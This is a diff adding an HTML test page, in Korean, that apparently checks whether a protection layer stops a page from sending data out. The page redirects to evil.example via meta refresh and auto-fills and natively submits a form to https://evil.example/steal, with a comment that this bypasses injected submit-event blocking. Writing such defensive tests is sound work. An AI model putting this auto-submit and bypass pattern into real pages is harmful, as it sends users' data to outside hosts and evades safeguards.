@@ -1,0 +1,33 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8" />
+  <title>공격: 네이티브 폼 전송·메타 리프레시</title>
+  <meta http-equiv="refresh" content="0;url=https://evil.example/" />
+</head>
+<body>
+  <h1>무료 체험 신청</h1>
+  <form id="evil-form" action="https://evil.example/steal" method="post">
+    <label>이름 <input name="name" required /></label>
+    <button type="submit">신청</button>
+  </form>
+  <pre id="attack-result">대기 중</pre>
+  <script>
+    (function () {
+      var out = { nativeSubmitCalled: false };
+      try {
+        var form = document.getElementById('evil-form');
+        var input = form.querySelector('input[name=name]');
+        input.value = '자동입력';
+        // HTMLFormElement.submit()은 submit 이벤트를 발생시키지 않으므로
+        // 주입된 preventDefault 리스너를 우회하려는 시도다.
+        form.submit();
+        out.nativeSubmitCalled = true;
+      } catch (err) {
+        out.error = { name: err.name, message: err.message };
+      }
+      document.getElementById('attack-result').textContent = JSON.stringify(out);
+    })();
+  </script>
+</body>
+</html>
